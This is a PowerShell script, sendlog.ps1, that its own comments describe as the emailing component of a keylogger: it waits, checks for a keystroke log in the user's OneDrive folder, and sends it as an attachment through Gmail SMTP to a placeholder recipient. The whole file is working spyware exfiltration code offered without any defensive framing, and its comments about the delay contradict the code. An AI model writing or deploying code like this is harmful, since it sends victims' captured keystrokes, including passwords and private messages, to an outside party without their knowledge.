# ==============================
# sendlog.ps1
# ==============================
# Waits 30 minutes, then sends the keylogger log file by email
# ==============================

# --- SETTINGS ---
$waitMinutes = 60
$UserName = $env:UserName
$logPath = "C:\Users\$UserName\OneDrive\log.txt"

# Email configuration (example: Gmail)
$smtpServer = "smtp.gmail.com"
$smtpPort   = 587
$from       = ".."
$to         = "..."
$subject    = "Keylogger Log File"
$body       = "Attached is the recorded log file."
$password   = ".."   # Use App Password (not your Gmail login)

# --- STEP 1: Wait 1 minute ---
Start-Sleep -Seconds ($waitMinutes)

# --- STEP 2: Check if log exists ---
if (Test-Path $logPath) {
    Write-Host "[*] Log file found at $logPath"
} else {
    Write-Host "[!] Log file not found: $logPath"
    exit
}

# --- STEP 3: Send email with attachment ---
try {
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential($from, $securePassword)

    Send-MailMessage -From $from -To $to -Subject $subject -Body $body `
        -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credential `
        -Attachments $logPath

    Write-Host "[*] Email sent successfully."
}
catch {
    Write-Host "[!] Failed to send email: $_"
}
